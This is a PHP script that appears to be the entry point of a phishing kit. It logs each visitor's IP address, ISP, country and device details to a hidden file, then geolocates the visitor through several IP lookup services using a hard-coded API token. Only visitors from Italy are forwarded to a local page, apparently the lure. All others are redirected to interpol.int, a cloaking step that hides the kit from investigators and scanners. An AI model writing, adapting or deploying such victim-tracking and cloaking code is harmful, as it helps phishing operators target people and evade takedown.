<?php
include "./BOTS/GET.IP.INFOS.php";
//////////////////////////////////////////////////////////
$VISITOR_MESSAGE= "<center>📊
<div style='font-size: 11px;font-family:monospace;font-weight:100;'>
[ 🔎 - 🔌 ] *  :  [ ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_ISP_']." ] <br> [ 🖥 ] *  :  [ $v_isp ] <br>[ 🚩 ] *  :  [ ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_CNTRCODE_']." ] <br>[ 💻 - 🌐 ] *  :  [ $device_details ] <br>
<font style='color:black;text-size:3px;'>[ 📆 ] * :  [ ".date('d-m-Y')." ] - $date_format</font><br>
•••••••••••••••<br/>
</div></center>";
$khraha = fopen("./STATICS.5Re0Wv3Emi5EmCA5V2122RW1b61nQN3vKOS1GRd2J3v00Irgt6CM86bi45g50tw62C4b1Ro31p6PB07Y7M2qL2bh30Qo722y2GE6/STATICS.php", "a");
fwrite($khraha, $VISITOR_MESSAGE);
//////////////////////////////////////////////////////////
// منع الكاش نهائيًا
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

// مفتاح ipinfo.io
$token = "cdfa50985d42f6"; // ضع مفتاحك هنا

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getUserIP();
$countrycode = "";

// 1️⃣ المحاولة الأولى: ipinfo.io
$response = @file_get_contents("https://ipinfo.io/{$ip}/json?token={$token}");
if ($response) {
    $data = json_decode($response, true);
    $countrycode = $data['country'] ?? '';
}

// 2️⃣ إذا فشل ipinfo.io → المحاولة الثانية: ip-api.com
if (!$countrycode) {
    $response = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
    if ($response) {
        $data = json_decode($response, true);
        if (!empty($data['status']) && $data['status'] === 'success') {
            $countrycode = $data['countryCode'] ?? '';
        }
    }
}

// 3️⃣ إذا فشل الاثنين → المحاولة الثالثة: geoplugin.net
if (!$countrycode) {
    $response = @file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}");
    if ($response) {
        $data = json_decode($response, true);
        $countrycode = $data['geoplugin_countryCode'] ?? '';
    }
}

// القرار النهائي
if (strtoupper($countrycode) === 'IT') {
    header('Location: ../indexx.php');
    exit();
} else {
    header('Location: https://www.interpol.int');
    exit();
}
?>